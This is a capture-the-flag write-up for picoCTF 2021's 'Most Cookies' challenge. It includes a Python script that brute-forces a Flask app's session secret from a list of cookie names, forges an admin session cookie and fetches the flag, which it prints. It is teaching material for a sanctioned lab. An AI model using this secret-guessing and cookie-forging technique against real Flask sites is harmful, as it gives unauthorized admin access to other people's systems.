# Decription
```
Alright, enough of using my own encryption. Flask session cookies should be plenty secure
```

We are given a python code of the site made with flask [server.py](https://github.com/ulissesj/CTFs/blob/main/picoCTF2021/most_cookies/server.py)

## Solution
We need to access /display by the GET method containing the admin cookie. I'm not familiar with flask, but after some research I found that flask cookies are encrypted in a specific way.
To find the secret key we need to get through the find the secret key, decode it, get through cookie_names, and send it back encrypited containing "admin" in "very_auth" field.
Running the script, we can get the flag.

```
import manageFlaskSession
import requests
import re

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

r = requests.post("http://mercury.picoctf.net:18835/search", data={"name": "butter"})
server_cookie = r.cookies["session"]

for cookie in cookie_names:
    try:
        my_cookie = manageFlaskSession.decodeFlaskCookie(cookie, server_cookie)
        print(f"Found correct key: {cookie}, contents = {my_cookie}")
        new_cookie = manageFlaskSession.encodeFlaskCookie(cookie, {u'very_auth': 'admin'})
        print("Testing new cookie: {new_cookie}")
        r = requests.get("http://mercury.picoctf.net:18835/display", cookies={"session": new_cookie})
        if match := re.search(r"picoCTF{[^}]+}", r.text): #regex to find the flag in the source code
            print ("Flag: {match.group(0)}")
        break
    except Exception:
        pass

```

### picoCTF{pwn_4ll_th3_cook1E5_743c20eb}

References:
[Flask sessions](https://pythonbasics.org/flask-sessions)

[Flask session cookie decoder/encoder](https://github.com/noraj/flask-session-cookie-manager)

[Useful John Hammond video](https://www.youtube.com/watch?v=kru8On32BqY)
